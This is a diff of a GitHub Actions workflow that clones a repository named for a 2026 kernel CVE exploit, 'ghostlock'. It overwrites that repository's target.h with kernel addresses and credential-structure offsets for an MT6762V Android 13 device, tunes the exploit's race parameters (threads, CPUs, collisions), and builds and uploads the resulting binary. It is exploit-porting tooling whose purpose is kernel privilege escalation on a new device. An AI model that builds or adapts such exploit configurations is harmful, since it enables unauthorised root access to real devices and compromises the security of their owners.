@@ -1,4 +1,4 @@
-name: build_k40_port_m36_final_v2
+name: build_k40_port_m36_FINAL_VERIFIED
 on: [push, workflow_dispatch]
 
 jobs:
@@ -24,22 +24,18 @@ jobs:
           git clone https://github.com/yijiacloud/ghostlock-cve-2026-43499-4.19-k40.git
           cd ghostlock-cve-2026-43499-4.19-k40
 
-      - name: OVERWRITE target.h (force)
+      - name: OVERWRITE target.h AND VERIFY
         run: |
           cd ghostlock-cve-2026-43499-4.19-k40
           TARGET_FILE="src/targets/oplus-4.19.157-perf/target.h"
           
-          # Save original for reference
-          cp "$TARGET_FILE" /tmp/k40_target.h.bak
-          
+          # Write our custom target.h
           cat > "$TARGET_FILE" << 'EOF'
           #ifndef TARGET_H
           #define TARGET_H
 
           #define BUILD_VARIANT_LABEL "m36_mt6762v_a13"
-          #ifndef BUILD_FINGERPRINT
           #define BUILD_FINGERPRINT "alps/m36/unknown:13/xxx/xxx:user/release-keys"
-          #endif
 
           #define KIMAGE_TEXT_BASE 0xffffff8008080000ULL
           #define P0_PAGE_OFFSET 0xffffff8000000000ULL
@@ -226,30 +222,53 @@ jobs:
           #endif
           EOF
           
-          echo "=== Verification: check label ==="
+          echo "=== VERIFICATION: target.h ==="
           grep "BUILD_VARIANT_LABEL" "$TARGET_FILE"
           grep "P0_PHYS_OFFSET" "$TARGET_FILE"
           grep "TASK_REAL_CRED_OFF" "$TARGET_FILE"
           
-          echo "=== File size ==="
-          wc -l "$TARGET_FILE"
+          if ! grep -q "m36_mt6762v_a13" "$TARGET_FILE"; then
+            echo "ERROR: target.h was NOT overwritten correctly!"
+            exit 1
+          fi
+          echo "=== target.h OK ==="
 
-      - name: Patch CPU count and thread count
+      - name: FIND AND PATCH CPU / THREADS / COLLISIONS
         run: |
           cd ghostlock-cve-2026-43499-4.19-k40
           
-          # Fix CPU count from 16 to 8 (0-7)
-          sed -i 's/g_cpu_count = 16/g_cpu_count = 8/g' src/*.c src/*.h 2>/dev/null || true
-          sed -i 's/cpu_count = 16/cpu_count = 8/g' src/*.c src/*.h 2>/dev/null || true
+          echo "=== BEFORE PATCH ==="
+          grep -rn "thread_cnt\|collisions\|g_cpu_count" src/*.c src/*.h | head -n 20
           
-          # Fix thread count from 8 to 7
-          sed -i 's/thread_cnt = 8/thread_cnt = 7/g' src/*.c src/*.h 2>/dev/null || true
+          # We use python to do the replacement with exact strings, since sed is failing
+          python3 << 'PYEOF'
+          import os, re
           
-          # Increase collisions from 4 to 16
-          sed -i 's/collisions = 4/collisions = 16/g' src/*.c src/*.h 2>/dev/null || true
+          for root, dirs, files in os.walk('src'):
+              for f in files:
+                  if f.endswith('.c') or f.endswith('.h'):
+                      path = os.path.join(root, f)
+                      with open(path, 'r') as file:
+                          content = file.read()
+                      
+                      # Replace thread_cnt
+                      content = re.sub(r'\bthread_cnt\s*=\s*8\b', 'thread_cnt = 7', content)
+                      content = re.sub(r'\bg_thread_cnt\s*=\s*8\b', 'g_thread_cnt = 7', content)
+                      
+                      # Replace collisions
+                      content = re.sub(r'\bcollisions\s*=\s*4\b', 'collisions = 16', content)
+                      content = re.sub(r'\bg_collisions\s*=\s*4\b', 'g_collisions = 16', content)
+                      
+                      # Replace cpu_count
+                      content = re.sub(r'\bg_cpu_count\s*=\s*16\b', 'g_cpu_count = 8', content)
+                      content = re.sub(r'\bcpu_count\s*=\s*16\b', 'cpu_count = 8', content)
+                      
+                      with open(path, 'w') as file:
+                          file.write(content)
+          PYEOF
           
-          echo "=== Verification: greps ==="
-          grep -rn "cpu_count\|thread_cnt\|collisions" src/*.c src/*.h 2>/dev/null | grep -E "= (8|7|16)" | head -n 10
+          echo "=== AFTER PATCH ==="
+          grep -rn "thread_cnt\|collisions\|g_cpu_count" src/*.c src/*.h | head -n 20
 
       - name: Build with NDK
         env:
@@ -265,5 +284,5 @@ jobs:
 
       - uses: actions/upload-artifact@v4
         with:
-          name: ghostlock-m36-final
+          name: ghostlock-m36-final-v2
           path: /tmp/out/
